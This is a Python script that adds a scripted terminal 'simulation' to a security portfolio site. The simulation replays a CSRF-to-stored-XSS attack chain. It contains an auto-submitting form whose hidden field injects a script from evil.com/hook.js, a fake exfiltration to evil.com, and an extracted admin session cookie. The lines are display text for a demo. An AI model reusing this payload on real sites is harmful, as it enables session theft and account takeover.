import re
import codecs

path = 'd:/abdo_portfolio/build/js/methodology.js'
with codecs.open(path, 'r', 'utf-8') as f:
    content = f.read()

chaining_sim = '''
  chaining: [
    { text: "root@kali:~# cat exploit.html", type: "cmd", delay: 800 },
    { text: "<!-- Attack Chain: CSRF to trigger Self-XSS -->", type: "info", delay: 200 },
    { text: "<form id='f' action='https://api.target.com/user/address' method='POST'>", type: "output", delay: 100 },
    { text: "  <input type='hidden' name='city' value='<script src=\\\"https://evil.com/hook.js\\\"></script>'>", type: "output", delay: 100 },
    { text: "</form>", type: "output", delay: 100 },
    { text: "<script>document.getElementById('f').submit();</script>", type: "output", delay: 100 },
    { text: "root@kali:~# python3 -m http.server 80", type: "cmd", delay: 1200 },
    { text: "Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...", type: "success", delay: 600 },
    { text: "Waiting for victim to click the link...", type: "warning", delay: 2000 },
    { text: "[*] Incoming connection from Target Admin IP (198.51.100.45)", type: "info", delay: 1500 },
    { text: "198.51.100.45 - - [17/Jun/2026 14:05:12] \\"GET /exploit.html HTTP/1.1\\" 200 -", type: "output", delay: 400 },
    { text: "[+] CSRF Executed! Admin address updated to payload.", type: "success", delay: 1000 },
    { text: "[*] XSS Payload Triggered in Admin Session!", type: "warning", delay: 800 },
    { text: "198.51.100.45 - - [17/Jun/2026 14:05:15] \\"GET /hook.js HTTP/1.1\\" 200 -", type: "output", delay: 400 },
    { text: "[+] Connection received on evil.com/exfiltrate", type: "success", delay: 1200 },
    { text: "Extracted Cookie: session_id=admin_778899aabbccddeeff; secure; HttpOnly=false", type: "success", delay: 500 },
    { text: "Extracted CSRF Token: csrf_998877", type: "success", delay: 300 },
    { text: "root@kali:~# Account Takeover Complete! 🏆", type: "cmd", delay: 1000 }
  ],
'''

if 'const simulationScripts = {' in content:
    content = content.replace('const simulationScripts = {', 'const simulationScripts = {\n' + chaining_sim)
    with codecs.open(path, 'w', 'utf-8') as f:
        f.write(content)
    print("Chaining simulation added.")
else:
    print("Could not find simulationScripts object.")
